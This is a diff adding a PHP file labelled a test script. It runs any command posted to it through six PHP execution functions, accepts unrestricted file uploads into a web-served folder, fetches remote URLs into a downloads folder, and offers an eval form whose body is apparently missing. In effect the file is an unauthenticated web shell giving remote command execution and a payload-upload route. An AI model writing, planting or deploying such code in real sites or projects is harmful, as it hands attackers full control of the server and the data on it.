@@ -1,0 +1,168 @@
+<?php
+// Display errors for debugging
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+echo "<h2>System, Upload, Fetch, Eval Test Script</h2>";
+
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd']; // For testing only. Always sanitize input in production!
+
+    echo "<h3>Testing Command: <code>" . htmlspecialchars($cmd) . "</code></h3>";
+
+    function tryCommand($method, $callback) {
+        try {
+            echo "<h4>$method Output:</h4><pre>";
+            ob_start(); // Start output buffering
+            $callback();
+            $output = ob_get_clean(); // Capture the output
+            echo htmlspecialchars($output ?: 'No Output');
+            echo "\nSuccess ✅";
+            echo "</pre>";
+        } catch (Throwable $e) {
+            echo "<h4>$method Failed ❌:</h4><pre>Error: " . htmlspecialchars($e->getMessage()) . "</pre>";
+        }
+    }
+
+    // 1. system()
+    tryCommand('system()', function () use ($cmd) {
+        system($cmd);
+    });
+
+    // 2. exec()
+    tryCommand('exec()', function () use ($cmd) {
+        $output = [];
+        $returnVar = null;
+        exec($cmd, $output, $returnVar);
+        echo implode("\n", $output);
+        echo "\nReturn Code: $returnVar";
+    });
+
+    // 3. shell_exec()
+    tryCommand('shell_exec()', function () use ($cmd) {
+        echo shell_exec($cmd);
+    });
+
+    // 4. passthru()
+    tryCommand('passthru()', function () use ($cmd) {
+        passthru($cmd);
+    });
+
+    // 5. popen()
+    tryCommand('popen()', function () use ($cmd) {
+        $handle = popen($cmd, 'r');
+        if ($handle) {
+            while (!feof($handle)) {
+                echo fgets($handle);
+            }
+            pclose($handle);
+        }
+    });
+
+    // 6. proc_open()
+    tryCommand('proc_open()', function () use ($cmd) {
+        $descriptorspec = [
+            0 => ['pipe', 'r'],
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w']
+        ];
+        $process = proc_open($cmd, $descriptorspec, $pipes);
+        if (is_resource($process)) {
+            echo stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+        }
+    });
+}
+
+// File Upload Handling
+if (isset($_FILES['file'])) {
+    $uploadDir = __DIR__ . '/uploads/';
+    if (!is_dir($uploadDir)) {
+        mkdir($uploadDir, 0777, true);
+    }
+    $filePath = $uploadDir . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
+        echo "<h3>File Uploaded Successfully ✅:</h3> <a href='uploads/" . htmlspecialchars(basename($_FILES['file']['name'])) . "'>View File</a>";
+    } else {
+        echo "<h3>File Upload Failed ❌</h3>";
+    }
+}
+
+// 3. Fetch remote content (curl / file_get_contents) and save to a file
+if (isset($_POST['url'])) {
+    $url = filter_var($_POST['url'], FILTER_VALIDATE_URL);
+    if ($url) {
+        echo "<h3>Fetching Remote Content from $url...</h3><pre>";
+        try {
+            $content = file_get_contents($url);
+            if ($content === false) {
+                throw new Exception('Failed to fetch content from URL.');
+            }
+
+            // Prepare a filename from URL (safe for filesystem)
+            $safeFilename = preg_replace('/[^a-zA-Z0-9_-]/', '_', parse_url($url, PHP_URL_HOST) . '_' . time()) . '.txt';
+
+            $savePath = __DIR__ . "/downloads/$safeFilename";
+
+            // Ensure the 'downloads' directory exists
+            if (!is_dir(__DIR__ . '/downloads')) {
+                mkdir(__DIR__ . '/downloads', 0777, true);
+            }
+
+            // Save content to file
+            if (file_put_contents($savePath, $content) !== false) {
+                echo "Fetched Content Saved Successfully ✅<br>";
+                echo "Saved to: <a href='downloads/" . htmlspecialchars($safeFilename) . "' target='_blank'>" . htmlspecialchars($safeFilename) . "</a>";
+            } else {
+                echo "Failed to Save Fetched Content ❌";
+            }
+        } catch (Throwable $e) {
+            echo "Error ❌: " . htmlspecialchars($e->getMessage());
+        }
+        echo "</pre>";
+    } else {
+        echo "<h3>Invalid URL ❌</h3>";
+    }
+}
+
+
+// Eval Testing
+if (isset($_POST['code'])) {
+    echo "<h3>Eval Output:</h3><pre>";
+    try {
+
+echo "\nSuccess ✅";
+    } catch (Throwable $e) {
+        echo "Error ❌: " . htmlspecialchars($e->getMessage());
+    }
+    echo "</pre>";
+}
+?>
+
+<h3>Test Functions:</h3>
+<form method="post">
+    <label>System Command:</label>
+    <input type="text" name="cmd" placeholder="e.g., ls -la">
+    <button type="submit">Run Command</button>
+</form>
+
+<form method="post" enctype="multipart/form-data">
+    <label>Upload File:</label>
+    <input type="file" name="file">
+    <button type="submit">Upload File</button>
+</form>
+
+<form method="post">
+    <label>Fetch Remote URL:</label>
+    <input type="text" name="url" placeholder="https://example.com">
+    <button type="submit">Fetch Content</button>
+</form>
+
+<form method="post">
+    <label>Execute PHP Code (Eval):</label>
+    <textarea name="code" placeholder="e.g., echo 'Hello World';"></textarea>
+    <button type="submit">Run Code</button>
+</form>
